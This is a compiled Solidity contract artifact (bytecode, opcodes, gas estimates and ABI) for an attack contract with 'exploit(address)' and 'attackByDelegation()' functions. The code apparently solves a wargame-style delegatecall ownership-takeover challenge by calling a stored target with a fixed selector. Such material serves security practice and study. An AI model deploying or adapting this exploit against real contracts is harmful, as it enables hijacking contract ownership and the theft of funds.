{
	"data": {
		"bytecode": {
			"linkReferences": {},
			"object": "608060405234801561001057600080fd5b50610309806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80630aeb4ddf1461003b578063809288f014610057575b600080fd5b610055600480360381019061005091906101e1565b610061565b005b61005f6100a4565b005b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff167fdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab60405160200161010f9190610227565b60405160208183030381529060405260405161012b91906102bc565b6000604051808303816000865af19150503d8060008114610168576040519150601f19603f3d011682016040523d82523d6000602084013e61016d565b606091505b505090508061017b57600080fd5b50565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006101ae82610183565b9050919050565b6101be816101a3565b81146101c957600080fd5b50565b6000813590506101db816101b5565b92915050565b6000602082840312156101f7576101f661017e565b5b6000610205848285016101cc565b91505092915050565b6000819050919050565b6102218161020e565b82525050565b600060208201905061023c6000830184610218565b92915050565b600081519050919050565b600081905092915050565b60005b8381101561027657808201518184015260208101905061025b565b83811115610285576000848401525b50505050565b600061029682610242565b6102a0818561024d565b93506102b0818560208601610258565b80840191505092915050565b60006102c8828461028b565b91508190509291505056fea2646970667358221220c1d884ef17164b6c72a705116ce37c163dda20c05eb7c48e72c2503d5bdfc0c364736f6c634300080d0033",
			"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x309 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xAEB4DDF EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x809288F0 EQ PUSH2 0x57 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x1E1 JUMP JUMPDEST PUSH2 0x61 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0xA4 JUMP JUMPDEST STOP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0xDD365B8B15D5D78EC041B851B68C8B985BEE78BEE0B87C4ACF261024D8BEABAB PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0x10F SWAP2 SWAP1 PUSH2 0x227 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD PUSH2 0x12B SWAP2 SWAP1 PUSH2 0x2BC JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x168 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x16D JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x17B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1AE DUP3 PUSH2 0x183 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1BE DUP2 PUSH2 0x1A3 JUMP JUMPDEST DUP2 EQ PUSH2 0x1C9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x1DB DUP2 PUSH2 0x1B5 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1F7 JUMPI PUSH2 0x1F6 PUSH2 0x17E JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x205 DUP5 DUP3 DUP6 ADD PUSH2 0x1CC JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x221 DUP2 PUSH2 0x20E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x23C PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x218 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x276 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x25B JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x285 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x296 DUP3 PUSH2 0x242 JUMP JUMPDEST PUSH2 0x2A0 DUP2 DUP6 PUSH2 0x24D JUMP JUMPDEST SWAP4 POP PUSH2 0x2B0 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x258 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2C8 DUP3 DUP5 PUSH2 0x28B JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC1 0xD8 DUP5 0xEF OR AND 0x4B PUSH13 0x72A705116CE37C163DDA20C05E 0xB7 0xC4 DUP15 PUSH19 0xC2503D5BDFC0C364736F6C634300080D003300 "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "155400",
				"executionCost": "202",
				"totalCost": "155602"
			},
			"external": {
				"attackByDelegation()": "infinite",
				"exploit(address)": "24700"
			}
		},
		"methodIdentifiers": {
			"attackByDelegation()": "809288f0",
			"exploit(address)": "0aeb4ddf"
		}
	},
	"abi": [
		{
			"inputs": [],
			"name": "attackByDelegation",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"internalType": "address",
					"name": "_addr",
					"type": "address"
				}
			],
			"name": "exploit",
			"outputs": [],
			"stateMutability": "nonpayable",
			"type": "function"
		}
	]
}